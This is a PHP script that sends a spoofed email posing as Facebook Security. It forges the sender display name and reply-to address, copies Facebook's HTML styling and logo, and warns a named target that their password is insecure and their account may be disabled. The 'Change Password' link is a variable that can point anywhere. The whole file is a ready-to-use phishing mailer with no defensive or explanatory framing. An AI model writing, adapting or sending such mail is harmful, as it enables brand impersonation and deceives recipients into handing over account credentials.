<?php
$targetName = "Adam";
$targetEmail = "AdamTest92@gmail.com";
$targetPasswordUrl = "https://www.facebook.com/settings";

// Mail Server Details 
$currentEmail = "support@testmymail.ml";
$to = $targetEmail;
$message = 
getFakeyHtml($targetName, $targetPasswordUrl);

// Setup Fakey Mail
$display = 'Facebook';
$subject = 'Important Information';

$reply = 'security@facebookmail.com';
$displayReply = 'Facebook Security';


// Ready Sending
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$headers .= 'From: '.$display.' <'.$currentEmail.'>'."\r\n".
    'Reply-To: '.$displayReply.' <'.$reply.'>'. "\r\n" .
    'X-Mailer: PHP/' . phpversion();
 
$msg  = '';

$msg .= $message;
$msg .= '';
 
// SEND
    if(mail($to, $subject, $msg, $headers)){
               echo "Sent to ".$to;
          } else{
               echo "Failed Sending";
     }


function getFakeyHtml($name, $targetPasswordUrl)
{
return '<html>
<head>
  <title>Facebook</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" width="device-width">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <style nonce="fH7624zl">
  @media all and (max-width: 480px){*[class].ib_t{min-width:100% !important}*[class].ib_row{display:block !important}*[class].ib_ext{display:block !important;padding:10px 0 5px 0;vertical-align:top !important;width:100% !important}*[class].ib_img,*[class].ib_mid{vertical-align:top !important}*[class].mb_blk{display:block !important;padding-bottom:10px;width:100% !important}*[class].mb_hide{display:none !important}*[class].mb_inl{display:inline !important}*[class].d_mb_flex=
  {display:block !important}}.d_mb_show{display:none}.d_mb_flex{display:flex}=
  @media only screen and (max-device-width: 480px){.d_mb_hide{display:none !important}.d_mb_show{display:block !important}.d_mb_flex{display:block !important}}.mb_text h1,.mb_text h2,.mb_text h3,.mb_text h4,.mb_text h5,.mb_text=
  h6{line-height:normal}.mb_work_text h1{font-size:18px;line-height:normal;margin-top:4px}.mb_work_text h2,.mb_work_text h3{font-size:16px;line-height:=
  normal;margin-top:4px}.mb_work_text h4,.mb_work_text h5,.mb_work_text h6{font-size:14px;line-height:normal}.mb_work_text a{color:#1270e9}.mb_work_text=
  p{margin-top:4px}
  </style>
</head>
<body style="margin:0;padding:0; bgcolor:#FFFFFF">
  <table border="0" cellspacing="0" cellpadding="0" align="center" id="email_table" style="border-collapse:collapse;">
    <tr>
      <td id="email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff;"></td>
    </tr>
    <tr style="">
      <td height="20" style="line-height:20px;" colspan="3"></td>
    </tr>
    <tr>
      <td width="15" style="display:block;width:15px;"></td>
      <td style="">
        <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
          <tr style="">
            <td height="15" style="line-height:15px;"></td>
          </tr>
          <tr>
            <td width="32" align="left" valign="middle" style="height:32px;line-height:0px;"><img src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/7s5lklTGUda.png" width="118" height="24" alt="Facebook" style="border:0;font-size:19px;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;color:#1877F2;"></td>
          </tr>
          <tr style="border-bottom:solid 1px #e5e5e5;">
            <td height="15" style="line-height:15px;"></td>
          </tr>
        </table>
      </td>
      <td width="15" style="display:block;width:15px;"></td>
    </tr>
    <tr>
      <td width="15" style="display:block;width:15px;"></td>
      <td style="">
        <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
          <tr style="">
            <td height="4" style="line-height:4px;"></td>
          </tr>
          <tr>
            <td style=">
              <div style="margin-top:16px; margin-bottom:20px;">
                <span class="mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823;">Hi '.$name.',</span><p class="mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:15px;line-height:21px;color:#141823;">We received information that indicates you are using an insecure password found in common password databases online.<br><br>Please change your Facebook password when possible, leaving your password unchanged can lead to your account being disabled.<br><br>We are very sorry for this inconvenience, however we take the security and privacy of our users seriously.<br><br>Kind Regards,<br>Facebook Security Bot.</p>
              </div>
              <div>
                
                            <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
                <tr style="">
                  <td height="20" style="line-height:20px;"></td>
                </tr>
                <tr>
                  <td align="middle" style="">
          
                    <table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;">
                      <tr>
                        <td style="border-collapse:collapse;border-radius:6px;text-align:center;display:block;border:none;box-shadow:none;background:#1877F2;padding:6px 20px 10px 20px;">
                          <a href="'.$targetPasswordUrl.'" style="color:#3b5998;text-decoration:none;display:block;"> <center>
                            <font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#FFFFFF;text-shadow:none;font-weight:500;font-family:Roboto-Medium,Roboto,-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:17px;">Change Password</span></font>
                          </center></a>
                         
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr style="">
                  <td height="8" style="line-height:8px;"></td>
                </tr>
                <tr style="">
                  <td height="20" style="line-height:20px;"></td>
                </tr>
              </table><br>
              
            </td>
          </tr>
          
        </table>
      </td>
      <td width="15" style="display:block;width:15px;"></td>
    </tr>
      
      <td width="15" style="display:block;width:15px;"></td>
    </tr>
    <tr style="">
      <td height="20" style="line-height:20px;" colspan="3"></td>
    </tr>
  </table><span style=""></span>
</body>
</html>';
}

function contains($search, $input)
{
  return (strpos($input,$search) !== false);
}

function has($param) 
{
   return array_key_exists($param, $_REQUEST);
}
?>